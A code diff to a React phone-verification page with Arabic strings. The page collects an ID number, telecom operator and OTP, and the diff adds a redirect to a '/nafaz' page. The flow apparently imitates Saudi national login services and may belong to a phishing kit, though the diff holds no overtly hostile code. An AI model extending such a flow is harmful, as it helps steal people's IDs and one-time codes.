@@ -1,4 +1,5 @@
 import { useEffect, useState, useCallback } from "react";
+import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
@@ -23,6 +24,7 @@ const telecomOperators = [
 ];
 
 export default function PhoneVerificationPage() {
+  const [, setLocation] = useLocation();
   const { toast } = useToast();
   const [idNumber, setIdNumber] = useState("");
   const [idError, setIdError] = useState("");
@@ -74,11 +76,14 @@ export default function PhoneVerificationPage() {
             setShowOtpDialog(false);
             toast({
               title: "تم التحقق بنجاح",
-              description: "تم التحقق من رقم الجوال بنجاح",
+              description: "جاري الانتقال إلى صفحة نفاذ...",
             });
+            setTimeout(() => {
+              setLocation("/nafaz");
+            }, 1000);
           } else if (data.phoneVerificationStatus === "rejected") {
             setShowWaitingModal(false);
-            setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح");
+            setOtpRejectionError("رمز التحقق غير صحيح - يرجى إعادة المحاولة");
             setShowOtpDialog(true);
           }
         }
